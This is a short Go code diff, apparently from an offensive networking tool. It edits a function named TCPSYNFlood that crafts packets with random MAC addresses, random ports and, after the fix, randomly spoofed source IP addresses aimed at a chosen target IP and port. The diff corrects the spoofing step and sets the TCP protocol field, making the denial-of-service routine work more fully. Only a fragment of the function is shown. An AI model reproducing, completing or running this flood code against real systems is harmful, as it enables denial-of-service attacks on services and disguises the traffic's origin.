@@ -16,8 +16,9 @@ func TCPSYNFlood(iface, targetIP, targetPort string, numberOfPackets int) {
 		ethLayer.SetDstMAC(utils.ParseMACGen())
 
 		ipLayer := packet.IPv4Layer()
-		ipLayer.SetSrcIP(utils.ParseMACGen())
+		ipLayer.SetSrcIP(utils.ParseIPGen())
 		ipLayer.SetDstIP(targetIP)
+		ipLayer.SetProtocol(golayers.IPProtocolTCP)
 
 		tcpLayer := packet.TCPLayer()
 		tcpLayer.SetSrcPort(utils.RandomPort())
